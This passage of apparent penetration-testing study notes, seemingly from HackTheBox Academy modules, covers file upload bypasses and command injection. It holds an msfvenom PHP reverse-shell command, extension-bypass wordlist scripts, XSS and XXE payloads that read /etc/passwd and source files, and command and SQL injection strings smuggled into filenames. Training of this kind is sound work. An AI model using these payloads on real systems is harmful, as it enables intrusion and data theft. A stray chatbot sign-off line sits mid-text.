</span></span></span></code></pre></div><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span>Payload size: 3033 bytes
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h2 id=client-side-validation-bypass>Client-Side Validation bypass</h2><p>¬†</p><p>¬†</p><p><a href=#R-image-9f34b44b75264b3275be29b088469316 class=lightbox-link><img alt=a6189250fcd673679e047bfbeeab86f1.png class="lazy lightbox figure-image" loading=lazy src=../../resources/a6189250fcd673679e047bfbeeab86f1.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-9f34b44b75264b3275be29b088469316><img alt=a6189250fcd673679e047bfbeeab86f1.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/a6189250fcd673679e047bfbeeab86f1.png></a></p><p>¬†</p><p>¬†</p><p><a href=#R-image-76dd5bd33035554a195d3c91cab7cd65 class=lightbox-link><img alt=ee238bf439778770d09c812a49989834.png class="lazy lightbox figure-image" loading=lazy src=../../resources/ee238bf439778770d09c812a49989834.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-76dd5bd33035554a195d3c91cab7cd65><img alt=ee238bf439778770d09c812a49989834.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/ee238bf439778770d09c812a49989834.png></a></p><p>¬†</p><p>¬†</p><h2 id=disabling-front-end-validation>Disabling Front-end Validation</h2><p>¬†</p><p><a href=#R-image-77258654c9930586e5832ec44c44732b class=lightbox-link><img alt=12a6c6d7b54609172fbca285d8d67cc5.png class="lazy lightbox figure-image" loading=lazy src=../../resources/12a6c6d7b54609172fbca285d8d67cc5.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-77258654c9930586e5832ec44c44732b><img alt=12a6c6d7b54609172fbca285d8d67cc5.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/12a6c6d7b54609172fbca285d8d67cc5.png></a></p><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=blacklist-filters>Blacklist Filters</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$fileName <span style=color:#f92672>=</span> <span style=color:#a6e22e>basename</span>($_FILES[<span style=color:#e6db74>&#34;uploadFile&#34;</span>][<span style=color:#e6db74>&#34;name&#34;</span>]);
</span></span><span style=display:flex><span>$extension <span style=color:#f92672>=</span> <span style=color:#a6e22e>pathinfo</span>($fileName, <span style=color:#a6e22e>PATHINFO_EXTENSION</span>);
</span></span><span style=display:flex><span>$blacklist <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;php&#39;</span>, <span style=color:#e6db74>&#39;php7&#39;</span>, <span style=color:#e6db74>&#39;phps&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($extension, $blacklist)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File type not allowed&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>¬†</p><p>¬†</p><p><strong>Tip:</strong> The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive, so we may try uploading a <code>php</code> with a mixed-case (e.g. <code>pHp</code>), which may bypass the blacklist as well, and should still execute as a PHP script.</p><p>¬†</p><p>There are many lists of extensions we can utilize in our fuzzing scan. <code>PayloadsAllTheThings</code> provides lists of extensions for <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst rel=external>PHP</a> and <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP rel=external>.NET</a> web applications. We may also use <code>SecLists</code> list of common <a href=https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt rel=external>Web Extensions</a>.</p><p>¬†</p><p><a href=#R-image-8c5a30159c62c7b3a9e872d2333a00f3 class=lightbox-link><img alt=984fa1336d28e0f1e5ddb12a843a6e57.png class="lazy lightbox figure-image" loading=lazy src=../../resources/984fa1336d28e0f1e5ddb12a843a6e57.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-8c5a30159c62c7b3a9e872d2333a00f3><img alt=984fa1336d28e0f1e5ddb12a843a6e57.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/984fa1336d28e0f1e5ddb12a843a6e57.png></a></p><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=whitelist-filters>Whitelist Filters</h1><p>¬†</p><h2 id=double-extensions>Double Extensions</h2><p>The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through <code>Double Extensions</code>. For example, if the <code>.jpg</code> extension was allowed, we can add it in our uploaded file name and still end our filename with <code>.php</code> (e.g. <code>shell.jpg.php</code>), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.</p><p>¬†</p><p>¬†</p><h2 id=reverse-double-extension>Reverse Double Extension</h2><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;FilesMatch</span> <span style=color:#960050;background-color:#1e0010>&#34;.+\.ph(ar|p|tml)&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    SetHandler application/x-httpd-php
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/FilesMatch&gt;</span></span></span></code></pre></div><p>The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches <code>.phar</code>, <code>.php</code>, and <code>.phtml</code>. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with (<code>$</code>). In such cases, any file that contains the above extensions will be allowed PHP code execution, even if it does not end with the PHP extension. For example, the file name (<code>shell.php.jpg</code>) should pass the earlier whitelist test as it ends with (<code>.jpg</code>), and it would be able to execute PHP code due to the above misconfiguration, as it contains (<code>.php</code>) in its name.</p><p>¬†</p><p>¬†</p><h2 id=character-injection>Character Injection</h2><p>Finally, let&rsquo;s discuss another method of bypassing a whitelist validation test through <code>Character Injection</code>. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.</p><p>The following are some of the characters we may try injecting:</p><ul><li><code>%20</code></li><li><code>%0a</code></li><li><code>%00</code></li><li><code>%0d0a</code></li><li><code>/</code></li><li><code>.\</code></li><li><code>.</code></li><li><code>‚Ä¶</code></li><li><code>:</code></li></ul><p>Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (<code>shell.php%00.jpg</code>) works with PHP servers with version <code>5.X</code> or earlier, as it causes the PHP web server to end the file name after the (<code>%00</code>), and store it as (<code>shell.php</code>), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (<code>:</code>) before the allowed file extension (e.g. <code>shell.aspx:.jpg</code>), which should also write the file as (<code>shell.aspx</code>). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.</p><p>We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the <code>PHP</code> and <code>JPG</code> extensions, as follows:</p><p>Code: bash</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#66d9ef>for</span> char in <span style=color:#e6db74>&#39;%20&#39;</span> <span style=color:#e6db74>&#39;%0a&#39;</span> <span style=color:#e6db74>&#39;%00&#39;</span> <span style=color:#e6db74>&#39;%0d0a&#39;</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#e6db74>&#39;.\\&#39;</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#e6db74>&#39;‚Ä¶&#39;</span> <span style=color:#e6db74>&#39;:&#39;</span>; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ext in <span style=color:#e6db74>&#39;.php&#39;</span> <span style=color:#e6db74>&#39;.phps&#39;</span>; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;shell</span>$char$ext<span style=color:#e6db74>.jpg&#34;</span> &gt;&gt; wordlist.txt
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;shell</span>$ext$char<span style=color:#e6db74>.jpg&#34;</span> &gt;&gt; wordlist.txt
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;shell.jpg</span>$char$ext<span style=color:#e6db74>&#34;</span> &gt;&gt; wordlist.txt
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;shell.jpg</span>$ext$char<span style=color:#e6db74>&#34;</span> &gt;&gt; wordlist.txt
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span></span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=type-filters>Type Filters</h1><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$type <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;uploadFile&#39;</span>][<span style=color:#e6db74>&#39;type&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($type, <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;image/jpg&#39;</span>, <span style=color:#e6db74>&#39;image/jpeg&#39;</span>, <span style=color:#e6db74>&#39;image/png&#39;</span>, <span style=color:#e6db74>&#39;image/gif&#39;</span>))) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Only images are allowed&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>¬†</p><p><a href=#R-image-5bb79c33e803f7c12d24f9569f5ac32c class=lightbox-link><img alt=84e84010e7ebece93604f1fcda4f3c9e.png class="lazy lightbox figure-image" loading=lazy src=../../resources/84e84010e7ebece93604f1fcda4f3c9e.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5bb79c33e803f7c12d24f9569f5ac32c><img alt=84e84010e7ebece93604f1fcda4f3c9e.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/84e84010e7ebece93604f1fcda4f3c9e.png></a></p><p>¬†</p><p>¬†</p><h2 id=mime-type>MIME-Type</h2><p>¬†</p><p>We may start by fuzzing the Content-Type header with SecLists&rsquo; <a href=https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt rel=external>Content-Type Wordlist</a> through Burp Intruder, to see which types are allowed. However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to <code>45</code> types only (compared to around 700 originally). We can do so as follows:</p><p>Type Filters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#34;this is a text file&#34; &gt; text.jpg 
</span></span><span style=display:flex><span>cube111@local[/local]$ file text.jpg 
</span></span><span style=display:flex><span>text.jpg: ASCII text
</span></span></code></pre></div><p>As we see, the file&rsquo;s MIME type is <code>ASCII text</code>, even though its extension is <code>.jpg</code>. However, if we write <code>GIF8</code> to the beginning of the file, it will be considered as a <code>GIF</code> image instead, even though its extension is still <code>.jpg</code>:</p><p>Type Filters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#34;GIF8&#34; &gt; text.jpg 
</span></span><span style=display:flex><span>cube111@local[/local]$file text.jpg
</span></span><span style=display:flex><span>text.jpg: GIF image data
</span></span></code></pre></div><p>Web servers can also utilize this standard to determine file types, which is usually more accurate than testing the file extension. The following example shows how a PHP web application can test the MIME type of an uploaded file:</p><p>Code: php</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$type <span style=color:#f92672>=</span> <span style=color:#a6e22e>mime_content_type</span>($_FILES[<span style=color:#e6db74>&#39;uploadFile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($type, <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;image/jpg&#39;</span>, <span style=color:#e6db74>&#39;image/jpeg&#39;</span>, <span style=color:#e6db74>&#39;image/png&#39;</span>, <span style=color:#e6db74>&#39;image/gif&#39;</span>))) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Only images are allowed&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>curl -X POST -F &ldquo;file=@/home/sinner/Documents/oscp/test.txt&rdquo; -F filename="/tmp/test.txt" http://192.168.185.249:33414/file-upload</p><p>¬†</p><p>¬†</p><h1 id=limited-file-uploads>Limited File Uploads</h1><h2 id=xss>XSS</h2><p>We can see that the <code>Comment</code> parameter was updated to our XSS payload. When the image&rsquo;s metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image&rsquo;s MIME-Type to <code>text/html</code>, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn&rsquo;t directly displayed.</p><p>Finally, XSS attacks can also be carried with <code>SVG</code> images, along with several other attacks. <code>Scalable Vector Graphics (SVG)</code> images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to <code>local.svg</code>:</p><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;svg</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://www.w3.org/2000/svg&#34;</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;1.1&#34;</span> <span style=color:#a6e22e>width=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>height=</span><span style=color:#e6db74>&#34;1&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;rect</span> <span style=color:#a6e22e>x=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>y=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>width=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>height=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>fill=</span><span style=color:#e6db74>&#34;green&#34;</span> <span style=color:#a6e22e>stroke=</span><span style=color:#e6db74>&#34;black&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;script</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;text/javascript&#34;</span><span style=color:#f92672>&gt;</span>alert(window.origin);<span style=color:#f92672>&lt;/script&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/svg&gt;</span></span></span></code></pre></div><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ exiftool -Comment=&#39; &#34;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;&#39; local.jpg
</span></span><span style=display:flex><span>cube111@local[/local]$ exiftool local.jpg
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span>Comment                         :  &#34;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h2 id=xxe>XXE</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;svg&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/svg&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>source code disclosure
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Code: xml
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34;&gt;</span> ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;svg&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/svg&gt;</span></span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><p>Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like <code>PDF</code>, <code>Word Documents</code>, <code>PowerPoint Documents</code>, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web application used a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we may also modify their XML data to include the malicious XXE elements, and we would be able to carry a blind XXE attack on the back-end web server.</p><p>Another similar attack that is also achievable through these file types is an SSRF attack. We may utilize the XXE vulnerability to enumerate the internally available services or even call private APIs to perform private actions. For more about SSRF, you may refer to the <a href=https://academy.hackthebox.com/module/details/145 rel=external>Server-side Attacks</a> module.</p><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><h2 id=other-file-upload-attacks>Other File Upload Attacks</h2><h3 id=-injections-in-file-name>üß™ Injections in File Name</h3><ul><li><p><strong>Command Injection</strong> via file name:</p><p>bash</p><p>CopyEdit</p><p><code>file$(whoami).jpgfile`whoami`.jpgfile.jpg||whoami</code></p><p>If used in OS commands (e.g., <code>mv</code>), it may execute arbitrary code.</p></li><li><p><strong>XSS Injection</strong>:</p><p>html</p><p>CopyEdit</p><p><code>&lt;script>alert(window.origin);&lt;/script></code></p><p>If file name is reflected in the UI.</p></li><li><p><strong>SQL Injection</strong>:</p><p>sql</p><p>CopyEdit</p><p><code>file';select+sleep(5);--.jpg</code></p><p>Dangerous if used directly in SQL queries.</p></li></ul><hr><h3 id=-upload-directory-disclosure>üìÅ Upload Directory Disclosure</h3><ul><li><p><strong>No direct link</strong> to uploaded file? Try:</p><ul><li><p><strong>Fuzzing</strong> to find directories</p></li><li><p><strong>LFI/XXE</strong> to read source code</p></li><li><p><strong>IDOR techniques</strong> to locate stored files</p></li></ul></li><li><p><strong>Triggering Errors</strong>:</p><ul><li><p>Upload file with duplicate name</p></li><li><p>Send <strong>two identical requests</strong> simultaneously</p></li><li><p>Upload a file with an <strong>extremely long name</strong> (e.g., 5000 chars)</p></li><li><p>Errors might disclose <strong>upload paths</strong></p></li></ul></li></ul><hr><h3 id=-windows-specific-attacks>ü™ü Windows-Specific Attacks</h3><ul><li><p><strong>Reserved Characters</strong>:</p><p>bash</p><p>CopyEdit</p><p><code>*, ?, &lt;, >, |</code></p><p>Might cause errors or disclosure if unsanitized.</p></li><li><p><strong>Reserved File Names</strong>:</p><p>bash</p><p>CopyEdit</p><p><code>CON, COM1, LPT1, NUL</code></p><p>Not allowed as filenames‚Äîcan be used to cause errors.</p></li><li><p><strong>8.3 Filename Convention</strong>:</p><ul><li><p>Used to refer to files using tilde (~):</p><p>bash</p><p>CopyEdit</p><p><code>HAC~1.TXT for hackthebox.txtWEB~.CONF to potentially overwrite web.conf</code></p></li><li><p>Can lead to:</p><ul><li><p>Information disclosure</p></li><li><p>Denial of Service</p></li><li><p>Unauthorized file access</p></li></ul></li></ul></li></ul><hr><h3 id=-advanced-file-upload-attacks>üß¨ Advanced File Upload Attacks</h3><ul><li><p>Exploitable cases where <strong>automatic processing</strong> occurs:</p><ul><li><p>Video encoding</p></li><li><p>File compression</p></li><li><p>File renaming</p></li></ul></li><li><p>Vulnerable Libraries:</p><ul><li>Example: <strong>AVI upload ‚Üí XXE via ffmpeg</strong></li></ul></li><li><p><strong>Custom code</strong> might hide <strong>unique vulnerabilities</strong>‚Äîrequires in-depth analysis.</p></li><li><p>üìö <strong>Bug bounty reports</strong> are a great source to study advanced file upload techniques.</p></li></ul><hr><p>Let me know if you want this turned into a visual mindmap or want to dive deeper into any technique.</p><p>¬†</p><p>¬†</p><h2 id=command-injection-methods>Command Injection Methods</h2><p>To inject an additional command to the intended one, we may use any of the following operators:</p><table><thead><tr><th><strong>Injection Operator</strong></th><th><strong>Injection Character</strong></th><th><strong>URL-Encoded Character</strong></th><th><strong>Executed Command</strong></th></tr></thead><tbody><tr><td>Semicolon</td><td><code>;</code></td><td><code>%3b</code></td><td>Both</td></tr><tr><td>New Line</td><td><code>\n</code></td><td><code>%0a</code></td><td>Both</td></tr><tr><td>Background</td><td><code>&</code></td><td><code>%26</code></td><td>Both (second output generally shown first)</td></tr><tr><td>Pipe</td><td><code>|</code></td><td><code>%7c</code></td><td>Both (only second output is shown)</td></tr><tr><td>AND</td><td><code>&&</code></td><td><code>%26%26</code></td><td>Both (only if first succeeds)</td></tr><tr><td>OR</td><td><code>|</code></td><td><code>%7c%7c</code></td><td>Second (only if first fails)</td></tr><tr><td>Sub-Shell</td><td><code>``</code></td><td><code>%60%60</code></td><td>Both (Linux-only)</td></tr><tr><td>Sub-Shell</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>Both (Linux-only)</td></tr></tbody></table><p>¬†</p><h2 id=and-operator>AND Operator</h2><p>We can start with the <code>AND</code> (<code>&&</code>) operator, such that our final payload would be (<code>127.0.0.1 && whoami</code>), and the final executed command would be the following:</p><p>Code: bash</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>ping -c 1 127.0.0.1 &amp;&amp; whoami</code></pre></div><p>¬†</p><p>¬†</p><p><a href=#R-image-09ff6541993a1ab9d19dfed96ee0cd1c class=lightbox-link><img alt=24d1be4971f710be049f5d49efc80f06.png class="lazy lightbox figure-image" loading=lazy src=../../resources/24d1be4971f710be049f5d49efc80f06.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-09ff6541993a1ab9d19dfed96ee0cd1c><img alt=24d1be4971f710be049f5d49efc80f06.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/24d1be4971f710be049f5d49efc80f06.png></a></p><p>¬†</p><p>¬†</p><hr><h2 id=or-operator>OR Operator</h2><p>Finally, let us try the <code>OR</code> (<code>||</code>) injection operator. The <code>OR</code> operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the <code>OR</code> operator would make our new command execute if the first one fails.</p><p>If we try to use our usual payload with the <code>||</code> operator (<code>127.0.0.1 || whoami</code>), we will see that only the first command would execute:</p><p>Other Injection Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>21y4d@local[/local]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms</code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><p><a href=#R-image-666dfc369dcf3ce7b235bb053b327643 class=lightbox-link><img alt=b97a8e7d2ac1db591843c3a8fdca0e9c.png class="lazy lightbox figure-image" loading=lazy src=../../resources/b97a8e7d2ac1db591843c3a8fdca0e9c.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-666dfc369dcf3ce7b235bb053b327643><img alt=b97a8e7d2ac1db591843c3a8fdca0e9c.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/b97a8e7d2ac1db591843c3a8fdca0e9c.png></a></p><p>¬†</p><p>¬†</p><h2 id=filterwaf-detection>Filter/WAF Detection</h2><h2 id=blacklisted-characters>Blacklisted Characters</h2><p>A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The <code>PHP</code> code may look something like the following:</p><p>Code: php</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>$blacklist = [&#39;&amp;&#39;, &#39;|&#39;, &#39;;&#39;, ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST[&#39;ip&#39;], $character) !== false) {
        echo &#34;Invalid input&#34;;
    }
}</code></pre></div><p>¬†</p><p>¬†</p><p><a href=#R-image-c2d5adbf3eb16349e54b67c49b9376be class=lightbox-link><img alt=7641f56a58889bb57f3561a3133926d7.png class="lazy lightbox figure-image" loading=lazy src=../../resources/7641f56a58889bb57f3561a3133926d7.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-c2d5adbf3eb16349e54b67c49b9376be><img alt=7641f56a58889bb57f3561a3133926d7.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/7641f56a58889bb57f3561a3133926d7.png></a></p><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><table><thead><tr><th><strong>Injection Operator</strong></th><th><strong>Injection Character</strong></th><th><strong>URL-Encoded Character</strong></th><th><strong>Executed Command</strong></th></tr></thead><tbody><tr><td>Semicolon</td><td><code>;</code></td><td><code>%3b</code></td><td>Both</td></tr><tr><td>New Line</td><td><code>\n</code></td><td><code>%0a</code></td><td>Both</td></tr><tr><td>Background</td><td><code>&</code></td><td><code>%26</code></td><td>Both (second output generally shown first)</td></tr><tr><td>Pipe</td><td><code>|</code></td><td><code>%7c</code></td><td>Both (only second output is shown)</td></tr><tr><td>AND</td><td><code>&&</code></td><td><code>%26%26</code></td><td>Both (only if first succeeds)</td></tr><tr><td>OR</td><td><code>|</code></td><td><code>%7c%7c</code></td><td>Second (only if first fails)</td></tr><tr><td>Sub-Shell</td><td><code>``</code></td><td><code>%60%60</code></td><td>Both (Linux-only)</td></tr><tr><td>Sub-Shell</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>Both (Linux-only)</td></tr></tbody></table><p>¬†</p><h1 id=bypassing-space-filters>Bypassing Space Filters</h1><h2 id=bypass-blacklisted-operators>Bypass Blacklisted Operators</h2><p>¬†</p><p><a href=#R-image-92ca3a6a657db7514af1bed418678b95 class=lightbox-link><img alt=faabfbff8c121853c7907c567433a4b8.png class="lazy lightbox figure-image" loading=lazy src=../../resources/faabfbff8c121853c7907c567433a4b8.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-92ca3a6a657db7514af1bed418678b95><img alt=faabfbff8c121853c7907c567433a4b8.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/faabfbff8c121853c7907c567433a4b8.png></a></p><p>¬†</p><h2 id=bypass-blacklisted-spaces>Bypass Blacklisted Spaces</h2><p>Now that we have a working injection operator, let us modify our original payload and send it again as (<code>127.0.0.1%0a whoami</code>): <a href=#R-image-08105ee887f5c37d97498b4e90f7610e class=lightbox-link><img alt="Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to &lsquo;127.0.0.1%0a+whoami&rsquo;. The response displays HTML for a Host Checker form and an &lsquo;Invalid input&rsquo; message." class="lazy lightbox figure-image" loading=lazy src=../../resources/cmdinj_filters_spaces_1.jpg style=height:auto;width:auto></a>
